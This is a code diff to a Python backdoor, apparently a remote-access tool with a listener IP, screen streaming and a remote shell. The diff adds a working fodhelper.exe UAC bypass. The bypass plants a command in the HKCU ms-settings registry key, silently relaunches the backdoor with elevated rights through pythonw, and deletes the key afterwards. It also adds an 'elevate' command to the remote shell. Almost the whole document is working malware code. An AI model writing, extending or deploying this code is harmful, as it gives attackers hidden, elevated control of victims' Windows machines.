@@ -18,6 +18,8 @@ import mss  # For taking screenshots
 import base64  # For encoding and decoding data in base64 format
 import io # For treating image bytes like a file in memory
 from PIL import Image # To convert raw RGB data to JPEG for compression
+import winreg  # For Windows registry manipulation
+import sys  # For system-specific parameters and functions
 
 # connection variables
 lip = "192.168.210.1" # Listener IP address
@@ -188,6 +190,62 @@ def stream_screen():
     except Exception as e:
         pass  # don’t crash if connection fails
 
+# Privilege Escalation Functions: Run commmand with elevated privileges using fodhelper.exe
+def fodhelper_escalate(command):
+    try:
+        # Registry key path that fodhelper.exe queries
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        # Create registry structure
+        try:
+            # Create the registry key
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            # Set the default value to the command we want to run with elevated privileges
+            winreg.SetValue(key, "", winreg.REG_SZ, command)
+            # Create DelegateExecute value (needs to exist but be empty)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)    
+            
+            # Execute fodhelper.exe - it will run our command with elevated privileges
+            # Using subprocess to start fodhelper silently
+            subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"], 
+                            shell=True, 
+                            stdout=subprocess.PIPE, 
+                            stderr=subprocess.PIPE,
+                            stdin=subprocess.PIPE)
+            # Wait a moment for fodhelper to execute
+            time.sleep(2)
+            # Clean up - remove the registry key
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\command")
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\Shell\Open")
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\Shell")
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass  # Cleanup errors are not critical  
+            return True
+        except Exception as e:
+            return False
+    except Exception as e:
+        return False
+
+# Privilege Escalation Functions: Spawn a new elevated shell 
+def spawn_elevated_shell():
+    try:
+        # Path to the current Python executable and script
+        python_path = sys.executable
+        script_path = os.path.abspath(__file__)
+        # Command to run another instance of this backdoor with elevated privileges
+        # Using pythonw.exe if available to run without window
+        if os.path.exists(python_path.replace('python.exe', 'pythonw.exe')):
+            python_cmd = python_path.replace('python.exe', 'pythonw.exe')
+        else:
+            python_cmd = python_path
+        # Build the command to run the backdoor elevated
+        elevated_cmd = f'"{python_cmd}" "{script_path}"'
+        # Use fodhelper to execute the command with elevated privileges
+        return fodhelper_escalate(elevated_cmd)
+    except Exception as e:
+        return False
 
 # Main shell function for command execution
 def shell():
@@ -243,6 +301,13 @@ def shell():
             t.daemon = True
             t.start()
             reliable_send('[+] Screen streaming started.')
+        elif command == 'elevate':
+            # Attempt to escalate privileges using fodhelper UAC bypass
+            result = spawn_elevated_shell()
+            if result:
+                reliable_send("[+] Privilege escalation initiated. New elevated shell should connect shortly.")
+            else:
+                reliable_send("[-] Privilege escalation failed.")
         else:
             try:
                 # For other commands, execute them using subprocess
